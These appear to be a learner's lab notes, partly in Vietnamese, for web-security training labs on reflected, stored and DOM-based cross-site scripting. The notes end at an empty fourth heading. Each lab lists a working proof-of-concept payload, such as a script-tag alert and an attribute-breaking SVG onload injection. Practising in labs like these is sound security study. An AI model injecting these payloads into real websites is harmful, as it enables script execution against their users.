# 1. LAB 

## 1. Lab: Reflected XSS into HTML context with nothing encoded ##

`<script>alert(0)</script>`

## 2. Lab: Stored XSS into HTML context with nothing encoded ##

Nhập script này vào phần comment, mỗi khi vào blog ( có cmt chứa script đó ) alert sẽ hiện lên
`<script>alert(0)</script>`

## 3. Lab: DOM XSS in document.write sink using source location.search ##

Input nằm trong thẻ `img src `
<img width="773" height="148" alt="image" src="https://github.com/user-attachments/assets/d6759e14-18cc-4ed9-8a59-c72d72c9bcca" />

Nhập `"><svg onload=alert(98898)>` để thoát attribute và nhập element mới

## 4. 









